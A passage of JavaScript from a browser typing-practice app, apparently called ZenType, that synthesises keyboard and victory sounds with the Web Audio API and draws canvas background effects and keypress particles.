        body.connect(bodyGain); bodyGain.connect(audioCtx.destination);
        body.start(t); body.stop(t + 0.08);
    }
}

function previewSound(profile) {
    initAudio();
    const vol = (userConfig.soundVolume || 70) / 100;
    const t = audioCtx.currentTime;
    const profiles = {
        typewriter: () => playSoundTypewriter(t, vol, true),
        blue: () => playSoundBlue(t, vol, true),
        red: () => playSoundRed(t, vol, true),
        creamy: () => playSoundCreamy(t, vol, true),
        bubble: () => playSoundBubble(t, vol, true),
        laser: () => playSoundLaser(t, vol, true),
        tactile: () => playSoundTactile(t, vol, true),
        membrane: () => playSoundMembrane(t, vol, true),
        neon: () => playSoundNeon(t, vol, true),
        retro: () => playSoundRetro(t, vol, true),
        space: () => playSoundSpace(t, vol, true),
        bullet: () => playSoundBullet(t, vol, true)
    };
    (profiles[profile] || profiles.typewriter)();
}

function playComboSound(comboLevel) {
    if (!soundEnabled || !audioCtx || !userConfig.comboSound) return;

    const osc = audioCtx.createOscillator();
    const gain = audioCtx.createGain();
    osc.connect(gain);
    gain.connect(audioCtx.destination);

    // Pitch Shift Logic: Use fixed freq if disabled, otherwise scale with combo
    const baseFreq = userConfig.pitchShift ? 500 + (comboLevel * 30) : 500;

    // Slight ramp if pitch shift is on, otherwise steady tone
    if (userConfig.pitchShift) {
        osc.frequency.setValueAtTime(baseFreq, audioCtx.currentTime);
        osc.frequency.exponentialRampToValueAtTime(baseFreq * 1.5, audioCtx.currentTime + 0.1);
    } else {
        osc.frequency.setValueAtTime(500, audioCtx.currentTime);
    }

    osc.type = 'sine';
    gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.2);
    osc.start(audioCtx.currentTime);
    osc.stop(audioCtx.currentTime + 0.2);
}

function toggleSound() {
    soundEnabled = !soundEnabled;
    const icon = UI.soundBtn.querySelector('i');
    if (soundEnabled) {
        icon.className = 'ri-volume-up-line text-xl';
        UI.soundBtn.classList.remove('muted');
    } else {
        icon.className = 'ri-volume-mute-line text-xl';
        UI.soundBtn.classList.add('muted');
    }
    localStorage.setItem('zenTypeSoundEnabled', soundEnabled);
}

// --- 3. EFFECTS ENGINE ---

let effectAnimId = null;

function hexToRgb(hex) {
    const r = parseInt(hex.slice(1, 3), 16);
    const g = parseInt(hex.slice(3, 5), 16);
    const b = parseInt(hex.slice(5, 7), 16);
    return { r, g, b };
}

function initParticles() {
    if (effectAnimId) cancelAnimationFrame(effectAnimId);
    const canvas = UI.particleCanvas;
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const type = userConfig.effectType || 'dust';
    const effects = { dust: runDustEffect, matrix: runMatrixEffect, starfield: runStarfieldEffect, fireflies: runFirefliesEffect, snow: runSnowEffect, rain: runRainEffect };
    (effects[type] || effects.dust)(canvas);
}

// ── EFFECT 1: FLOATING DUST ──
function runDustEffect(canvas) {
    const ctx = canvas.getContext('2d');
    const intensity = userConfig.effectIntensity / 50; // 0.2 to 2.0
    const count = Math.floor(35 * intensity);
    const particles = [];
    for (let i = 0; i < count; i++) {
        particles.push({
            x: Math.random() * canvas.width, y: Math.random() * canvas.height,
            radius: Math.random() * 3 + 1, speedX: (Math.random() - 0.5) * 0.4,
            speedY: (Math.random() - 0.5) * 0.3 - 0.1, opacity: (Math.random() * 0.4 + 0.1) * Math.min(intensity, 1.2),
            pulse: Math.random() * Math.PI * 2
        });
    }
    function frame() {
        const { r, g, b } = hexToRgb(userConfig.effectColor || '#ffd700');
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        particles.forEach(p => {
            p.x += p.speedX; p.y += p.speedY; p.pulse += 0.02;
            if (p.x < -10) p.x = canvas.width + 10;
            if (p.x > canvas.width + 10) p.x = -10;
            if (p.y < -10) p.y = canvas.height + 10;
            if (p.y > canvas.height + 10) p.y = -10;
            const flicker = p.opacity + Math.sin(p.pulse) * 0.15;
            ctx.beginPath(); ctx.arc(p.x, p.y, p.radius * 3, 0, Math.PI * 2);
            ctx.fillStyle = `rgba(${r}, ${g}, ${b}, ${flicker * 0.15})`; ctx.fill();
            ctx.beginPath(); ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
            ctx.fillStyle = `rgba(${r}, ${g}, ${b}, ${flicker})`; ctx.fill();
        });
        effectAnimId = requestAnimationFrame(frame);
    }
    frame();
}

// --- VICTORY SOUNDS ---
function playSoundSheath(ctx, vol) {
    if (!ctx) return;
    const t = ctx.currentTime;

    // Metallic Slide (Noise + Bandpass)
    const noiseBuffer = ctx.createBuffer(1, ctx.sampleRate * 0.5, ctx.sampleRate);
    const output = noiseBuffer.getChannelData(0);
    for (let i = 0; i < output.length; i++) {
        output[i] = Math.random() * 2 - 1;
    }
    const noise = ctx.createBufferSource();
    noise.buffer = noiseBuffer;

    const filter = ctx.createBiquadFilter();
    filter.type = 'bandpass';
    filter.frequency.setValueAtTime(1000, t);
    filter.frequency.linearRampToValueAtTime(4000, t + 0.3); // Slide up
    filter.Q.value = 5;

    const gain = ctx.createGain();
    gain.gain.setValueAtTime(vol * 0.8, t);
    gain.gain.exponentialRampToValueAtTime(0.01, t + 0.3);

    noise.connect(filter);
    filter.connect(gain);
    gain.connect(ctx.destination);
    noise.start(t);
    noise.stop(t + 0.4);

    // Sharp "Click" (Sine burst)
    const osc = ctx.createOscillator();
    osc.type = 'triangle';
    osc.frequency.setValueAtTime(800, t + 0.25);
    const clickGain = ctx.createGain();
    clickGain.gain.setValueAtTime(0, t);
    clickGain.gain.setValueAtTime(vol, t + 0.25);
    clickGain.gain.exponentialRampToValueAtTime(0.01, t + 0.35);
    osc.connect(clickGain);
    clickGain.connect(ctx.destination);
    osc.start(t);
    osc.stop(t + 0.4);
}

function playSoundGong(ctx, vol) {
    if (!ctx) return;
    const t = ctx.currentTime;

    // Fundamental Tone (Deep Sine)
    const osc = ctx.createOscillator();
    osc.type = 'sine';
    osc.frequency.setValueAtTime(100, t);
    osc.frequency.exponentialRampToValueAtTime(80, t + 2); // Pitch drop slightly

    const gain = ctx.createGain();
    gain.gain.setValueAtTime(vol * 1.5, t);
    gain.gain.exponentialRampToValueAtTime(0.01, t + 4); // Long decay

    // Metallic Overtones (FM Synthesis / Multiple Osc)
    const osc2 = ctx.createOscillator();
    osc2.type = 'square';
    osc2.frequency.setValueAtTime(150, t);
    const gain2 = ctx.createGain();
    gain2.gain.setValueAtTime(vol * 0.3, t);
    gain2.gain.exponentialRampToValueAtTime(0.01, t + 2);

    osc.start(t);
    osc2.start(t);
    osc.connect(gain);
    osc2.connect(gain2);
    gain.connect(ctx.destination);
    gain2.connect(ctx.destination);
    osc.stop(t + 4.5);
    osc2.stop(t + 4.5);
}

// ── EFFECT 2: MATRIX RAIN ──
function runMatrixEffect(canvas) {
    const ctx = canvas.getContext('2d');
    const intensity = userConfig.effectIntensity / 50;
    const fontSize = 14;
    const spacing = Math.max(1, Math.floor(3 / intensity)); // denser at higher intensity
    const columns = Math.floor(canvas.width / (fontSize * spacing));
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZアイウエオカキクケコ0123456789';
    const trailLen = Math.floor(16 * intensity);

    const cols = [];
    for (let i = 0; i < columns; i++) {
        cols.push({ drop: Math.floor(Math.random() * (canvas.height / fontSize)), trail: [] });
    }

    function frame() {
        const { r, g, b } = hexToRgb(userConfig.effectColor || '#39ff14');
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        ctx.font = `${fontSize}px 'JetBrains Mono', monospace`;

        for (let i = 0; i < cols.length; i++) {
            const col = cols[i];
            const char = chars[Math.floor(Math.random() * chars.length)];
            col.trail.push({ char, row: col.drop });
            if (col.trail.length > trailLen) col.trail.shift();

            for (let t = 0; t < col.trail.length; t++) {
                const age = (t + 1) / col.trail.length;
                const opacity = age * Math.min(0.7 * intensity, 0.95);
                ctx.fillStyle = t === col.trail.length - 1
                    ? `rgba(${Math.min(r + 80, 255)}, ${Math.min(g + 80, 255)}, ${Math.min(b + 80, 255)}, ${Math.min(0.9 * intensity, 1)})`
                    : `rgba(${r}, ${g}, ${b}, ${opacity})`;
                ctx.fillText(col.trail[t].char, i * fontSize * spacing, col.trail[t].row * fontSize);
            }

            col.drop++;
            if (col.drop * fontSize > canvas.height && Math.random() > 0.975) {
                col.drop = 0;
                col.trail = [];
            }
        }
        effectAnimId = requestAnimationFrame(frame);
    }
    frame();
}

// ── EFFECT 3: STARFIELD ──
function runStarfieldEffect(canvas) {
    const ctx = canvas.getContext('2d');
    const intensity = userConfig.effectIntensity / 50;
    const count = Math.floor(200 * intensity);
    const speed = 3 * intensity;
    const stars = [];
    const cx = canvas.width / 2, cy = canvas.height / 2;
    for (let i = 0; i < count; i++) {
        stars.push({
            x: (Math.random() - 0.5) * canvas.width,
            y: (Math.random() - 0.5) * canvas.height,
            z: Math.random() * canvas.width
        });
    }

    function frame() {
        const { r, g, b } = hexToRgb(userConfig.effectColor || '#ffffff');
        ctx.clearRect(0, 0, canvas.width, canvas.height);

        stars.forEach(s => {
            s.z -= speed;
            if (s.z <= 0) {
                s.x = (Math.random() - 0.5) * canvas.width;
                s.y = (Math.random() - 0.5) * canvas.height;
                s.z = canvas.width;
            }
            const sx = (s.x / s.z) * 300 + cx;
            const sy = (s.y / s.z) * 300 + cy;
            const size = Math.max(0, (1 - s.z / canvas.width) * 3);
            const opacity = (1 - s.z / canvas.width) * Math.min(intensity, 1.3);

            if (size > 0) {
                const trailZ = s.z + 20;
                const prevSx = (s.x / trailZ) * 300 + cx;
                const prevSy = (s.y / trailZ) * 300 + cy;
                ctx.beginPath(); ctx.moveTo(prevSx, prevSy); ctx.lineTo(sx, sy);
                ctx.strokeStyle = `rgba(${r}, ${g}, ${b}, ${opacity * 0.5})`;
                ctx.lineWidth = size * 0.6; ctx.stroke();

                ctx.beginPath(); ctx.arc(sx, sy, size, 0, Math.PI * 2);
                ctx.fillStyle = `rgba(${r}, ${g}, ${b}, ${opacity})`;
                ctx.fill();
            }
        });
        effectAnimId = requestAnimationFrame(frame);
    }
    frame();
}

// ── EFFECT 4: FIREFLIES ──
function runFirefliesEffect(canvas) {
    const ctx = canvas.getContext('2d');
    const intensity = userConfig.effectIntensity / 50;
    const count = Math.floor(20 * intensity);
    const flies = [];
    for (let i = 0; i < count; i++) {
        flies.push({
            x: Math.random() * canvas.width, y: Math.random() * canvas.height,
            radius: (Math.random() * 5 + 3) * Math.min(intensity, 1.5),
            angle: Math.random() * Math.PI * 2, speed: (Math.random() * 0.5 + 0.2) * intensity,
            wanderSpeed: Math.random() * 0.02 + 0.005,
            pulse: Math.random() * Math.PI * 2, pulseSpeed: Math.random() * 0.03 + 0.01
        });
    }

    function frame() {
        const { r, g, b } = hexToRgb(userConfig.effectColor || '#ffd700');
        ctx.clearRect(0, 0, canvas.width, canvas.height);

        flies.forEach(f => {
            f.angle += (Math.random() - 0.5) * f.wanderSpeed * 10;
            f.x += Math.cos(f.angle) * f.speed;
            f.y += Math.sin(f.angle) * f.speed;
            f.pulse += f.pulseSpeed;

            if (f.x < -20) f.x = canvas.width + 20;
            if (f.x > canvas.width + 20) f.x = -20;
            if (f.y < -20) f.y = canvas.height + 20;
            if (f.y > canvas.height + 20) f.y = -20;

            const glow = (0.3 + Math.sin(f.pulse) * 0.35 + 0.35) * Math.min(intensity, 1.3);

            const grad = ctx.createRadialGradient(f.x, f.y, 0, f.x, f.y, f.radius * 6);
            grad.addColorStop(0, `rgba(${r}, ${g}, ${b}, ${glow * 0.3})`);
            grad.addColorStop(1, `rgba(${r}, ${g}, ${b}, 0)`);
            ctx.beginPath(); ctx.arc(f.x, f.y, f.radius * 6, 0, Math.PI * 2);
            ctx.fillStyle = grad; ctx.fill();

            ctx.beginPath(); ctx.arc(f.x, f.y, f.radius, 0, Math.PI * 2);
            ctx.fillStyle = `rgba(${r}, ${g}, ${b}, ${glow})`;
            ctx.fill();
        });
        effectAnimId = requestAnimationFrame(frame);
    }
    frame();
}

// ── EFFECT 5: SNOW ──
function runSnowEffect(canvas) {
    const ctx = canvas.getContext('2d');
    const intensity = userConfig.effectIntensity / 50;
    const count = Math.floor(80 * intensity);
    const flakes = [];
    for (let i = 0; i < count; i++) {
        flakes.push({
            x: Math.random() * canvas.width, y: Math.random() * canvas.height,
            radius: Math.random() * 3 + 1, speedY: (Math.random() * 1 + 0.3) * intensity,
            sway: Math.random() * Math.PI * 2, swaySpeed: Math.random() * 0.02 + 0.005,
            swayAmp: Math.random() * 0.8 + 0.2,
            opacity: (Math.random() * 0.5 + 0.3) * Math.min(intensity, 1.2)
        });
    }

    function frame() {
        const { r, g, b } = hexToRgb(userConfig.effectColor || '#ffffff');
        ctx.clearRect(0, 0, canvas.width, canvas.height);

        flakes.forEach(f => {
            f.sway += f.swaySpeed;
            f.x += Math.sin(f.sway) * f.swayAmp;
            f.y += f.speedY;
            if (f.y > canvas.height + 10) { f.y = -10; f.x = Math.random() * canvas.width; }

            ctx.beginPath(); ctx.arc(f.x, f.y, f.radius * 2, 0, Math.PI * 2);
            ctx.fillStyle = `rgba(${r}, ${g}, ${b}, ${f.opacity * 0.15})`; ctx.fill();

            ctx.beginPath(); ctx.arc(f.x, f.y, f.radius, 0, Math.PI * 2);
            ctx.fillStyle = `rgba(${r}, ${g}, ${b}, ${f.opacity})`; ctx.fill();
        });
        effectAnimId = requestAnimationFrame(frame);
    }
    frame();
}

// ── EFFECT 6: RAIN ──
function runRainEffect(canvas) {
    const ctx = canvas.getContext('2d');
    const intensity = userConfig.effectIntensity / 50;
    const count = Math.floor(100 * intensity);
    const drops = [];

    for (let i = 0; i < count; i++) {
        drops.push({
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height,
            length: Math.random() * 20 + 10,
            speed: (Math.random() * 10 + 5) * intensity,
            opacity: (Math.random() * 0.5 + 0.1) * Math.min(intensity, 1.2)
        });
    }

    function frame() {
        const { r, g, b } = hexToRgb(userConfig.effectColor || '#00d4ff');
        ctx.clearRect(0, 0, canvas.width, canvas.height); // Clear but allow trails if desired (complex) - keeping simple clear

        ctx.strokeStyle = `rgba(${r}, ${g}, ${b}, 0.5)`;
        ctx.lineWidth = 1;
        ctx.lineCap = 'round';

        drops.forEach(d => {
            d.y += d.speed;
            if (d.y > canvas.height) {
                d.y = -d.length;
                d.x = Math.random() * canvas.width;
            }

            ctx.beginPath();
            ctx.moveTo(d.x, d.y);
            ctx.lineTo(d.x, d.y + d.length);
            // Dynamic opacity based on individual drop and global intensity
            ctx.strokeStyle = `rgba(${r}, ${g}, ${b}, ${d.opacity})`;
            ctx.stroke();
        });
        effectAnimId = requestAnimationFrame(frame);
    }
    frame();
}

window.addEventListener('resize', () => {
    UI.particleCanvas.width = window.innerWidth;
    UI.particleCanvas.height = window.innerHeight;
});

// ── KEYPRESS PARTICLES ──
let keyCtx;
let keyParticles = [];
let keypressAnimId = null;

function initKeypressParticles() {
    const canvas = UI.keypressCanvas;
    if (!canvas) return;
    keyCtx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    window.addEventListener('resize', () => {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    });

    loopKeypressParticles();
}

function loopKeypressParticles() {
    if (!keyCtx) return;

    keyCtx.clearRect(0, 0, UI.keypressCanvas.width, UI.keypressCanvas.height);

    for (let i = keyParticles.length - 1; i >= 0; i--) {
        const p = keyParticles[i];
        p.x += p.vx;
        p.y += p.vy;
        p.vy += p.gravity || 0;
        p.life -= p.decay;

        // Custom physics during life
        if (p.shape === 'rings') {
            p.size += 1.5; // Rings expand outwards
        } else if (p.shape === 'snow' || p.shape === 'leaves' || p.shape === 'petals') {
            p.x += Math.sin(p.life * 10) * (p.shape === 'leaves' ? 1.5 : (p.shape === 'petals' ? 1.2 : 0.5)); // Drifting sway
            if (p.shape === 'snow') p.size -= 0.02; // Slow melt shrink
        } else if (p.shape === 'ghosts') {
            p.x += Math.sin(p.life * 5) * 1.0; // Slower wavy float
            p.size += 0.05; // Slightly expand as they rise
        } else if (p.shape === 'bokeh') {
            p.size += 0.1; // Expand gently
        } else if (p.shape === 'fire') {
            p.size *= 0.92; // Shrinks faster
        } else if (p.shape === 'hexagons' || p.shape === 'crosses' || p.shape === 'leaves' || p.shape === 'petals' || p.shape === 'polygons') {
            p.rot = (p.rot || 0) + (p.vx > 0 ? 0.05 : -0.05); // Spin based on direction
            if (p.shape !== 'petals') p.size *= 0.95;
        } else if (p.shape === 'lines' || p.shape === 'sparks') {
            p.size *= 0.90; // Fade out fast
        } else if (p.shape === 'dust') {
            p.x += (Math.random() - 0.5) * 0.5; // random jitter walk
            p.y += (Math.random() - 0.5) * 0.5;
        } else if (p.shape === 'swirls') {
            p.rot = (p.rot || 0) + 0.15;
            p.x += Math.cos(p.rot) * 2;
            p.y += Math.sin(p.rot) * 2;
        } else if (p.shape === 'lightning') {
            p.x += (Math.random() - 0.5) * 4;
            p.y += (Math.random() - 0.5) * 4;
            p.size *= 0.8; // flashes out fast
        } else if (p.shape === 'orbs') {
            // High gravity handles movement, just drift size smoothly
            p.size *= 0.99;
        } else if (p.shape === 'gems' || p.shape === 'diamonds') {
            p.rot = (p.rot || 0) + (p.vx > 0 ? 0.08 : -0.08);
            p.size *= 0.96;
        } else if (p.shape === 'waves') {
            p.y += Math.sin(p.life * 15) * 2; // Fast snake wave
            p.size *= 0.95;
        } else if (p.shape === 'pulse') {
            p.size = p.baseSize + Math.sin(p.life * 20) * (p.baseSize * 0.5); // size throbs
            p.life -= p.decay * 0.5; // lasts longer to show pulse
        } else if (p.shape === 'confetti') {
            p.rot = (p.rot || 0) + (p.vx > 0 ? 0.2 : -0.2); // wild spin
            p.x += Math.sin(p.life * 5) * 2; // paper flutter
        } else {
            p.size *= 0.94; // Default shrink
        }

        if (p.life <= 0 || (p.shape !== 'rings' && p.shape !== 'lines' && p.size < 0.1)) {
            keyParticles.splice(i, 1);
            continue;
        }

        const { r, g, b } = hexToRgb(p.color);
        const rgba = `rgba(${r}, ${g}, ${b}, ${p.life})`;

        if (p.shape === 'bubbles' || p.shape === 'rings') {
            keyCtx.beginPath();
            keyCtx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
            keyCtx.strokeStyle = rgba;
            keyCtx.lineWidth = p.shape === 'rings' ? 2 * p.life : 1.5;
            keyCtx.stroke();
            if (p.shape === 'bubbles') {
                keyCtx.fillStyle = `rgba(${r}, ${g}, ${b}, ${p.life * 0.2})`;
                keyCtx.fill();
            }
        } else if (p.shape === 'digital') {
            keyCtx.fillStyle = rgba;
            // Draw a rectangle stretched in direction
            const width = Math.abs(p.vx) > Math.abs(p.vy) ? p.size * 3 : p.size;
            const height = Math.abs(p.vy) >= Math.abs(p.vx) ? p.size * 3 : p.size;
            keyCtx.fillRect(p.x - width / 2, p.y - height / 2, width, height);
        } else if (p.shape === 'binary') {
            keyCtx.font = `${Math.floor(p.size * 4)}px var(--font-main, monospace)`;
            keyCtx.fillStyle = rgba;
            keyCtx.fillText(p.char, p.x, p.y);
        } else if (p.shape === 'triangles') {
            keyCtx.beginPath();
            const rot = p.life * 5; // Spin effect
            for (let j = 0; j < 3; j++) {
                const angle = rot + (j * Math.PI * 2 / 3);
                const tx = p.x + Math.cos(angle) * p.size * 1.5;
                const ty = p.y + Math.sin(angle) * p.size * 1.5;
                if (j === 0) keyCtx.moveTo(tx, ty);
                else keyCtx.lineTo(tx, ty);
            }
            keyCtx.closePath();
            keyCtx.fillStyle = rgba;
            keyCtx.fill();
        } else if (p.shape === 'hexagons') {
            keyCtx.save();
            keyCtx.translate(p.x, p.y);
            keyCtx.rotate(p.rot || 0);
            keyCtx.beginPath();
            for (let j = 0; j < 6; j++) {
                const angle = j * Math.PI / 3;
                const tx = Math.cos(angle) * p.size;
                const ty = Math.sin(angle) * p.size;
                if (j === 0) keyCtx.moveTo(tx, ty);
                else keyCtx.lineTo(tx, ty);
            }
            keyCtx.closePath();
            keyCtx.fillStyle = rgba;
            keyCtx.fill();
            keyCtx.restore();
        } else if (p.shape === 'crescents') {
            keyCtx.save();
            keyCtx.translate(p.x, p.y);
            // Slowly rotate the crescent over its life
            keyCtx.rotate((1 - p.life) * 3);
            keyCtx.beginPath();
            // Outer arc
            keyCtx.arc(0, 0, p.size, Math.PI * 0.5, Math.PI * 1.5, false);
            // Inner arc to cut it out
            keyCtx.arc(p.size * 0.4, 0, p.size * 0.9, Math.PI * 1.5, Math.PI * 0.5, true);
            keyCtx.closePath();
            keyCtx.fillStyle = rgba;
            keyCtx.fill();
            keyCtx.restore();
        } else if (p.shape === 'droplets') {
            keyCtx.save();
            keyCtx.translate(p.x, p.y);
            // Point droplet upwards always (falling down)
            keyCtx.beginPath();
            keyCtx.arc(0, 0, p.size, 0, Math.PI);
            keyCtx.lineTo(0, -p.size * 2);
            keyCtx.closePath();
            keyCtx.fillStyle = rgba;
            keyCtx.fill();
            keyCtx.restore();
        } else if (p.shape === 'crosses') {
            keyCtx.save();
            keyCtx.translate(p.x, p.y);
            keyCtx.rotate(p.rot || 0);
            keyCtx.strokeStyle = rgba;
            keyCtx.lineWidth = 1.5;
            keyCtx.beginPath();
            keyCtx.moveTo(-p.size, 0); keyCtx.lineTo(p.size, 0);
            keyCtx.moveTo(0, -p.size); keyCtx.lineTo(0, p.size);
            keyCtx.stroke();
            keyCtx.restore();
        } else if (p.shape === 'lines') {
            keyCtx.beginPath();
            keyCtx.moveTo(p.x, p.y);
            // Draw a trailing line behind the particle based on velocity
            keyCtx.lineTo(p.x - p.vx * 3, p.y - p.vy * 3);
            keyCtx.strokeStyle = rgba;
            keyCtx.lineWidth = 2;
            keyCtx.stroke();
        } else if (p.shape === 'leaves') {
            keyCtx.save();
            keyCtx.translate(p.x, p.y);
            keyCtx.rotate(p.rot || 0);
            keyCtx.beginPath();
            keyCtx.ellipse(0, 0, p.size, p.size * 2, 0, 0, Math.PI * 2);
            keyCtx.fillStyle = rgba;
            keyCtx.fill();
            keyCtx.restore();
        } else if (p.shape === 'runes' || p.shape === 'notes') {
            keyCtx.font = `${Math.floor(p.size * 5)}px var(--font-main, monospace)`;
            keyCtx.fillStyle = rgba;
            keyCtx.fillText(p.char, p.x, p.y);
        } else if (p.shape === 'sparks') {
            keyCtx.fillStyle = rgba;
            keyCtx.fillRect(p.x, p.y, p.size * 1.5, p.size * 3); // simple falling streak
        } else if (p.shape === 'comets') {
            keyCtx.beginPath();
            keyCtx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
            keyCtx.fillStyle = rgba;
            keyCtx.fill();
            // Tail
            keyCtx.beginPath();
            keyCtx.moveTo(p.x, p.y);
            keyCtx.lineTo(p.x - p.vx * 4, p.y - p.vy * 4);
            keyCtx.strokeStyle = `rgba(${r}, ${g}, ${b}, ${p.life * 0.5})`;
            keyCtx.lineWidth = p.size;
            keyCtx.stroke();
        } else if (p.shape === 'polygons') {
            keyCtx.save();
            keyCtx.translate(p.x, p.y);
            keyCtx.rotate(p.rot || 0);
            keyCtx.beginPath();
            const sides = p.sides || 3;
            for (let j = 0; j < sides; j++) {
                const angle = j * 2 * Math.PI / sides;
                const tx = Math.cos(angle) * p.size;
                const ty = Math.sin(angle) * p.size;
                if (j === 0) keyCtx.moveTo(tx, ty);
                else keyCtx.lineTo(tx, ty);
            }
            keyCtx.closePath();
            keyCtx.fillStyle = rgba;
            keyCtx.fill();
            keyCtx.restore();
        } else if (p.shape === 'dust') {
            keyCtx.fillStyle = rgba;
            keyCtx.fillRect(p.x, p.y, p.size, p.size);
        } else if (p.shape === 'ghosts' || p.shape === 'bokeh') {
            keyCtx.beginPath();
            keyCtx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
            // Softer look for ghosts and bokeh
            keyCtx.fillStyle = `rgba(${r}, ${g}, ${b}, ${p.shape === 'ghosts' ? p.life * 0.6 : p.life * 0.4})`;
            keyCtx.fill();
        } else if (p.shape === 'petals') {
            keyCtx.save();
            keyCtx.translate(p.x, p.y);
            keyCtx.rotate(p.rot || 0);
            keyCtx.beginPath();
            keyCtx.ellipse(0, 0, p.size * 0.6, p.size, 0, 0, Math.PI * 2);
            keyCtx.fillStyle = rgba;
            keyCtx.fill();
            keyCtx.restore();
        } else if (p.shape === 'gems') {
            keyCtx.save();
            keyCtx.translate(p.x, p.y);
            keyCtx.rotate(p.rot || 0);
            keyCtx.beginPath();
            keyCtx.moveTo(0, -p.size);
            keyCtx.lineTo(p.size * 0.5, 0);
            keyCtx.lineTo(0, p.size);
            keyCtx.lineTo(-p.size * 0.5, 0);
            keyCtx.closePath();
            keyCtx.fillStyle = rgba;
            keyCtx.fill();
            keyCtx.restore();
        } else if (p.shape === 'orbs') {
            keyCtx.save();
            keyCtx.globalCompositeOperation = 'lighter'; // Additive blending
            const grad = keyCtx.createRadialGradient(Math.max(0, p.x), Math.max(0, p.y), 0, Math.max(0, p.x), Math.max(0, p.y), Math.max(0.1, p.size));
            grad.addColorStop(0, `rgba(${r}, ${g}, ${b}, ${p.life * 0.8})`);
            grad.addColorStop(1, `rgba(${r}, ${g}, ${b}, 0)`);
            keyCtx.fillStyle = grad;
            keyCtx.beginPath();
            keyCtx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
            keyCtx.fill();
            keyCtx.restore();
        } else if (p.shape === 'swirls') {
            keyCtx.save();
            keyCtx.translate(p.x, p.y);
            keyCtx.rotate(p.rot || 0);
            keyCtx.beginPath();
            keyCtx.arc(0, 0, p.size, 0, Math.PI);
            keyCtx.strokeStyle = rgba;
            keyCtx.lineWidth = 1.5;
            keyCtx.stroke();
            keyCtx.restore();
        } else if (p.shape === 'lightning') {
            keyCtx.save();
            keyCtx.beginPath();
            keyCtx.moveTo(p.x, p.y);
            let lx = p.x, ly = p.y;
            for (let k = 0; k < 4; k++) {
                lx += (Math.random() - 0.5) * p.size * 2;
                ly += (Math.random() - 0.5) * p.size * 2;
                keyCtx.lineTo(lx, ly);
            }
            keyCtx.strokeStyle = rgba;
            keyCtx.lineWidth = Math.max(1, p.life * 2);
            keyCtx.stroke();
            keyCtx.restore();
        } else if (p.shape === 'pixels') {
            keyCtx.fillStyle = rgba;
            const pxSize = Math.max(1, Math.floor(p.size));
            keyCtx.fillRect(Math.floor(p.x), Math.floor(p.y), pxSize, pxSize);
        } else if (p.shape === 'skulls') {
            keyCtx.font = `${Math.floor(p.size * 4)}px var(--font-main, monospace)`;
            keyCtx.fillStyle = rgba;
            keyCtx.fillText('☠', p.x, p.y);
        } else if (p.shape === 'diamonds') {
            keyCtx.save();
            keyCtx.translate(p.x, p.y);
            keyCtx.rotate(p.rot || 0);
            keyCtx.beginPath();
            keyCtx.moveTo(0, -p.size * 1.5);
            keyCtx.lineTo(p.size * 0.8, 0);
            keyCtx.lineTo(0, p.size * 1.5);
            keyCtx.lineTo(-p.size * 0.8, 0);
            keyCtx.closePath();
            keyCtx.fillStyle = rgba;
            keyCtx.fill();
            keyCtx.restore();
        } else if (p.shape === 'waves') {
            keyCtx.beginPath();
            keyCtx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
            keyCtx.fillStyle = rgba;
            keyCtx.fill();
        } else if (p.shape === 'pulse') {
            keyCtx.beginPath();
            keyCtx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
            // double stroke effect
            keyCtx.fillStyle = rgba;
            keyCtx.fill();
            keyCtx.beginPath();
            keyCtx.arc(p.x, p.y, p.size * 1.5, 0, Math.PI * 2);
            keyCtx.strokeStyle = `rgba(${r}, ${g}, ${b}, ${p.life * 0.3})`;
            keyCtx.lineWidth = 1;
            keyCtx.stroke();
        } else if (p.shape === 'confetti') {
            keyCtx.save();
            keyCtx.translate(p.x, p.y);
            keyCtx.rotate(p.rot || 0);
            keyCtx.fillStyle = rgba;
            keyCtx.fillRect(-p.size, -p.size * 0.5, p.size * 2, p.size); // Rectangular confetti
            keyCtx.restore();
        } else {
            // default / fire / snow
            keyCtx.beginPath();
            keyCtx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
            keyCtx.fillStyle = rgba;
            keyCtx.fill();
        }
    }

    // Only keep looping if there are particles to render; stop when idle
    if (keyParticles.length > 0) {
        keypressAnimId = requestAnimationFrame(loopKeypressParticles);
    } else {
        keypressAnimId = null;
    }
}

function spawnKeypressParticles(x, y) {
    if (!userConfig.particle) return;

    const count = 4 + Math.random() * 6;
    const color = userConfig.particleColor || '#ffd700';
    const shape = userConfig.particleShape || 'default';

    for (let i = 0; i < count; i++) {
        const angle = Math.random() * Math.PI * 2;

        let speed = 2 + Math.random() * 5;
        let pColor = color; // Allow shape to safely override base config color
        let life = 1.0;
        let decay = 0.03 + Math.random() * 0.05;
        let size = 2 + Math.random() * 3;
        let vx = Math.cos(angle) * speed;
        let vy = Math.sin(angle) * speed;
        let gravity = 0;
        let char = '';
        let sides = undefined;

        // Custom behaviors based on shape
        if (shape === 'bubbles') {
            speed = 1.5 + Math.random() * 2;
            vx = Math.cos(angle) * speed * 0.5; // less horizontal
            vy = -Math.abs(Math.sin(angle) * speed) - 1; // fly upwards
            gravity = -0.05; // float up faster
            size = 3 + Math.random() * 5;
        } else if (shape === 'digital') {
            speed = 3 + Math.random() * 7;
            const dirs = [[0, -1], [0, 1], [1, 0], [-1, 0]];
            const d = dirs[Math.floor(Math.random() * dirs.length)];
            vx = d[0] * speed;
            vy = d[1] * speed;
            size = 1 + Math.random() * 2;
            decay = 0.04 + Math.random() * 0.06;
        } else if (shape === 'fire') {
            speed = 1 + Math.random() * 3;
            vx = (Math.random() - 0.5) * 2;
            vy = -speed - 1; // Always fly upwards
            gravity = -0.08;
            size = 4 + Math.random() * 5; // Starts larger
            decay = 0.04 + Math.random() * 0.04;
            // Pick a random hot color (or fallback)
